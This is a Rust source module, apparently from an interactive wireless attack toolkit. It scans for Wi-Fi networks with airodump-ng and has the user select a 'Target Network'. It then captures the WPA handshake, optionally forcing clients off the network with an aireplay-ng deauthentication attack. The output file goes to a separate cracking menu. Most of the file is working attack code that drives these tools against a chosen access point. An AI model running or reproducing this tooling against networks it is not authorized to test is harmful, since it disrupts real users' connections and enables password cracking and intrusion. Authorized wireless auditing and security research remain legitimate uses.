use dialoguer::{theme::ColorfulTheme, Select, Input};
use pnet::datalink;
use std::process::{Command, Stdio};
use std::io::{BufRead, BufReader};
use std::thread;
use std::time::Duration;
use std::path::Path;

#[derive(Debug, Clone)]
struct WifiNetwork {
    bssid: String,
    channel: String,
    essid: String,
    power: String,
}

pub fn run() {
    let selections = &["Select Monitor Interface and Capture Handshake", "Back"];

    loop {
        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Authentication Capture Menu")
            .default(0)
            .items(&selections[..])
            .interact()
            .unwrap();

        match selections[selection] {
            "Select Monitor Interface and Capture Handshake" => select_interface(),
            "Back" => break,
            _ => unreachable!(),
        }
    }
}

fn select_interface() {
    let interfaces = datalink::interfaces();
    let wireless_interfaces: Vec<_> = interfaces
        .iter()
        .filter(|iface| iface.name.starts_with("wl") || iface.name.contains("wlan") || iface.name.starts_with("mon"))
        .collect();

    if wireless_interfaces.is_empty() {
        println!("No wireless interfaces found.");
        println!("Make sure you have configured a monitor mode interface first.");
        return;
    }

    let interface_names: Vec<String> = wireless_interfaces
        .iter()
        .map(|iface| {
            let mode = if check_monitor_mode(&iface.name) {
                "Monitor Mode"
            } else {
                "Managed Mode"
            };
            format!("{} ({}) [{}]", iface.name, iface.mac.unwrap_or_default(), mode)
        })
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select Monitor Interface")
        .default(0)
        .items(&interface_names)
        .interact()
        .unwrap();

    let selected_interface = wireless_interfaces[selection].name.clone();
    
    // Check if in monitor mode
    if !check_monitor_mode(&selected_interface) {
        println!("\nError: Interface {} is not in monitor mode!", selected_interface);
        println!("Please use 'Change Card Mode' from the Wireless menu to enable monitor mode first.\n");
        
        let options = vec!["Back"];
        let _selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Press Enter to go back")
            .default(0)
            .items(&options[..])
            .interact()
            .unwrap();
        return;
    }
    
    capture_menu(&selected_interface);
}

fn capture_menu(interface: &str) {
    let mut selected_network: Option<WifiNetwork> = None;
    let mut output_path: String = "/tmp/handshake".to_string();

    loop {
        // Validate interface still exists
        if !interface_exists(interface) {
            println!("\nError: Interface {} no longer exists!", interface);
            println!("The interface may have been removed or driver crashed.");
            println!("Returning to main menu...\n");
            thread::sleep(Duration::from_secs(2));
            break;
        }

        let network_info = if let Some(ref network) = selected_network {
            format!("Selected: {} ({})", network.essid, network.bssid)
        } else {
            "No network selected".to_string()
        };

        let file_info = format!("Output: {}-01.cap", output_path);

        let mut options = vec!["Scan and Select Network", "Set Output File Path"];
        
        if selected_network.is_some() {
            options.push("Start Handshake Capture (with deauth)");
            options.push("Start Passive Capture (no deauth)");
        }
        options.push("Back");

        println!("\n{}", network_info);
        println!("{}\n", file_info);

        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Capture Menu")
            .default(0)
            .items(&options[..])
            .interact()
            .unwrap();

        match options[selection] {
            "Scan and Select Network" => {
                selected_network = scan_and_select_network(interface);
            }
            "Set Output File Path" => {
                if let Ok(path) = Input::<String>::new()
                    .with_prompt("Enter output file path (without extension)")
                    .default(output_path.clone())
                    .interact()
                {
                    output_path = path;
                }
            }
            "Start Handshake Capture (with deauth)" => {
                if let Some(ref network) = selected_network {
                    start_capture(interface, network, &output_path, true);
                }
            }
            "Start Passive Capture (no deauth)" => {
                if let Some(ref network) = selected_network {
                    start_capture(interface, network, &output_path, false);
                }
            }
            "Back" => break,
            _ => unreachable!(),
        }
    }
}

fn interface_exists(interface: &str) -> bool {
    let output = Command::new("ip")
        .args(&["link", "show", interface])
        .output();

    match output {
        Ok(output) => output.status.success(),
        Err(_) => false,
    }
}

fn check_monitor_mode(interface: &str) -> bool {
    let output = Command::new("iwconfig")
        .arg(interface)
        .output();

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);
        stdout.contains("Mode:Monitor")
    } else {
        false
    }
}

fn scan_and_select_network(interface: &str) -> Option<WifiNetwork> {
    // Validate interface before scanning
    if !interface_exists(interface) {
        println!("Error: Interface {} does not exist!", interface);
        return None;
    }

    if !check_monitor_mode(interface) {
        println!("Error: Interface {} is not in monitor mode!", interface);
        return None;
    }

    println!("Scanning for networks on {}...", interface);
    println!("This will take about 10 seconds...\n");

    // Create temporary file for airodump-ng output
    let temp_file = "/tmp/spofr_scan";
    
    // Start airodump-ng
    let mut child = Command::new("airodump-ng")
        .args(&[
            interface,
            "-w", temp_file,
            "--output-format", "csv",
            "--write-interval", "1"
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn();

    if child.is_err() {
        println!("Error: Failed to start airodump-ng.");
        println!("Make sure airodump-ng is installed (aircrack-ng suite).");
        return None;
    }

    // Wait for scan
    thread::sleep(Duration::from_secs(10));

    // Kill airodump-ng
    if let Ok(ref mut process) = child {
        let _ = process.kill();
    }

    // Parse results
    let networks = parse_airodump_csv(&format!("{}-01.csv", temp_file));

    // Clean up temp files
    let _ = Command::new("rm")
        .args(&["-f", &format!("{}-01.csv", temp_file)])
        .status();
    let _ = Command::new("rm")
        .args(&["-f", &format!("{}-01.cap", temp_file)])
        .status();

    if networks.is_empty() {
        println!("No networks found.");
        return None;
    }

    // Display and select network
    let network_list: Vec<String> = networks
        .iter()
        .map(|n| format!("{} | {} | Ch:{} | Pwr:{}", 
            n.essid, n.bssid, n.channel, n.power))
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select Target Network")
        .default(0)
        .items(&network_list)
        .interact()
        .unwrap();

    Some(networks[selection].clone())
}

fn parse_airodump_csv(filepath: &str) -> Vec<WifiNetwork> {
    let mut networks = Vec::new();
    
    let file = match std::fs::File::open(filepath) {
        Ok(f) => f,
        Err(_) => return networks,
    };

    let reader = BufReader::new(file);
    let mut in_ap_section = false;
    
    for line in reader.lines() {
        if let Ok(line) = line {
            let trimmed = line.trim();
            
            if trimmed.starts_with("BSSID") {
                in_ap_section = true;
                continue;
            }
            
            if trimmed.starts_with("Station MAC") {
                break; // End of AP section
            }
            
            if in_ap_section && !trimmed.is_empty() {
                let parts: Vec<&str> = trimmed.split(',').map(|s| s.trim()).collect();
                
                if parts.len() >= 14 {
                    let bssid = parts[0].to_string();
                    let channel = parts[3].to_string();
                    let power = parts[8].to_string();
                    let essid = parts[13].to_string();
                    
                    // Skip hidden/empty SSIDs
                    if !essid.is_empty() && essid != " " {
                        networks.push(WifiNetwork {
                            bssid,
                            channel,
                            essid,
                            power,
                        });
                    }
                }
            }
        }
    }
    
    networks
}

fn start_capture(interface: &str, network: &WifiNetwork, output_path: &str, use_deauth: bool) {
    // Validate interface before attack
    if !interface_exists(interface) {
        println!("\nError: Interface {} does not exist!", interface);
        println!("The interface may have been removed or driver crashed.");
        return;
    }

    if !check_monitor_mode(interface) {
        println!("\nError: Interface {} is not in monitor mode!", interface);
        return;
    }

    println!("\n=== Starting Handshake Capture ===");
    println!("Target: {} ({})", network.essid, network.bssid);
    println!("Channel: {}", network.channel);
    println!("Interface: {}", interface);
    println!("Output: {}-01.cap", output_path);
    if use_deauth {
        println!("Mode: Active capture with deauthentication");
    } else {
        println!("Mode: Passive capture (waiting for natural handshake)");
    }
    println!("\nPress Ctrl+C to stop.\n");

    // Kill any lingering processes
    let _ = Command::new("pkill")
        .args(&["-9", "airodump-ng"])
        .status();
    let _ = Command::new("pkill")
        .args(&["-9", "aireplay-ng"])
        .status();

    thread::sleep(Duration::from_millis(300));

    // Start airodump-ng in background to capture handshake
    let airodump_child = Command::new("airodump-ng")
        .args(&[
            "--bssid", &network.bssid,
            "-c", &network.channel,
            "-w", output_path,
            "--output-format", "cap",
            interface
        ])
        .spawn();

    if airodump_child.is_err() {
        println!("Error: Failed to start capture.");
        println!("Make sure airodump-ng is installed (aircrack-ng suite).");
        return;
    }

    // Give airodump-ng time to start
    thread::sleep(Duration::from_secs(2));

    if use_deauth {
        println!("Starting deauthentication attack to force handshake...\n");
        
        // Send limited deauth packets to trigger handshake
        let _status = Command::new("aireplay-ng")
            .args(&[
                "--deauth", "10",  // Send 10 deauth packets
                "-a", &network.bssid,
                interface
            ])
            .status();

        println!("\nDeauth packets sent. Waiting for handshake...");
        println!("Airodump-ng is still running. Check the capture file.");
        println!("Press Ctrl+C when you see 'WPA handshake' in the output.\n");
    } else {
        println!("Waiting for handshake (clients must reconnect naturally)...\n");
    }

    // Keep the capture running until user stops it
    let mut airodump_process = airodump_child.unwrap();
    let _ = airodump_process.wait();

    // Check if capture file exists
    let cap_file = format!("{}-01.cap", output_path);
    if Path::new(&cap_file).exists() {
        println!("\n\nCapture saved to: {}", cap_file);
        println!("You can now crack this file in the Cracking menu.");
    } else {
        println!("\n\nWarning: Capture file not found at expected location.");
    }
}
